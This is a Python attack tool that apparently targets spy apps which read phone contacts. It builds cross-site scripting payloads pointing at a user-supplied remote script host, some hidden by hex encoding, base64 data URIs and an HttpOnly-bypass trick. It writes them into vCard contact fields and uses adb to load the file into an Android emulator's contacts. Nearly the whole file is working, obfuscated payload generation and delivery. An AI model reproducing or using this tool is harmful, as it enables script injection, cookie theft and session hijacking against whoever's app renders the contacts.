import argparse
import base64
import os
import time


class XSS(object):
    def __init__(self) -> None:
        super().__init__()
        self.banner()
        parser = argparse.ArgumentParser()
        parser.add_argument(
            "payload", help="Enter your evil JavaScript code link", type=str)
        self.args = parser.parse_args()

    def banner(self):
        banner = \
        '''
        \/(`(`  (`|)\ /
        /\_)_)___)|  |    

        Author: fkc0ps
        Use XSS to counter spy app
        '''
        print(banner)

    def load_src(self):
        self.src = self.args.payload
        print("[+] 当前链接: {}".format(self.args.payload))

    def basic_payloads(self):
        '''
        生成基础的XSS payload
        '''
        with open("basic_payload.txt", "r+", encoding="utf-8") as f:
            basic_list = f.readlines()

        out_basic_list = []
        for x in basic_list:
            x = x.strip()
            x = x.replace("{payload}", self.src)
            out_basic_list.append(x)
        return out_basic_list
        # print(out_basic_list)

    def advanced_payloads(self):
        '''
        生成绕过限制的XSS payload
        '''
        # IMG形式利用【eval+hex】
        payload1 = "<img src=1 onerror=eval(\"{hex_code}\")>"
        js_code = "s=createElement('script');body.appendChild(s);s.src='//{src}'"
        js_code = js_code.replace("{src}", self.src)
        hex_code = self.str2hex(js_code)
        payload1 = payload1.replace("{hex_code}", hex_code)
        # print(payload1)

        # Object形式利用
        payload2 = "<object data=\"data:text/html;base64,{b64_code}\"></object>"
        js_code = "<script src=https://{src}></script>".replace(
            "{src}", self.src)
        b64_code = base64.b64encode(js_code.encode())
        payload2 = payload2.replace("{b64_code}", b64_code.decode())
        # print(payload2)

        # Details形式利用
        payload3 = "<details open ontoggle =eval(\"{hex_code}\")>"
        js_code = "$.getScript(\"https://{src}\")".replace("{src}", self.src)
        hex_code = self.str2hex(js_code)
        payload3 = payload3.replace("{hex_code}", hex_code)
        # print(payload3)

        # Bypass Httponly 401方式
        payload4 = "<script src=\"https://{doamin}/x.php?c={path}&m=4\"></script>"
        src_list = self.src.split("/")
        payload4 = payload4.replace("{doamin}", src_list[0])
        payload4 = payload4.replace("{path}", src_list[1])
        # print(payload4)

        out_advanced_list = [payload1, payload2, payload3, payload4]
        return out_advanced_list

    def out_putfile(self, paylaods):
        cvf_list = ["BEGIN:VCARD", "VERSION:2.1", "N:;{payload};;;", "FN:{payload}", "TEL;CELL:1-885-632-1205",
                    "TEL;CELL:1-885-632-1205", "EMAIL;HOME:{payload}", "EMAIL;HOME:{payload}", "END:VCARD"]
        tmp_list = self.src.split("/")
        self.file_name = tmp_list[1] + "_payload.vcf"
        try:
            with open(self.file_name, "w+", encoding="utf-8") as f:
                for x in paylaods:
                    for y in cvf_list:
                        p = y.replace("{payload}", x) + "\n"
                        f.write(p)
            print("[+] 文件输出成功!")
            print("[+] Vcf文件名: {}".format(self.file_name))
        except Exception as e:
            print("[!] error:{}".format(e))

    def str2hex(self, str):
        js_code = bytes(str, "utf-8")
        hex_str = ""
        for x in js_code:
            x = hex(x).replace("0x", "")
            hex_str += "\\x{}".format(x)
        return hex_str


if __name__ == '__main__':
    xss = XSS()
    xss.load_src()
    payloads = xss.basic_payloads() + xss.advanced_payloads()
    xss.out_putfile(payloads)
    print("[*] 清除历史联系人数据")
    time.sleep(2)
    os.system("adb shell pm clear com.android.providers.contacts")
    os.system(
        "adb push ./{} /storage/emulated/0/Download/{}".format(xss.file_name, xss.file_name))
    print("[*] vcf文件已经推送到模拟器")
    time.sleep(3)
    print("[*] 开始导入联系人数据")
    os.system('adb shell am start -t "text/x-vcard" -d "file:///storage/emulated/0/Download/{}" -a android.intent.action.VIEW com.android.contacts'.format(xss.file_name))
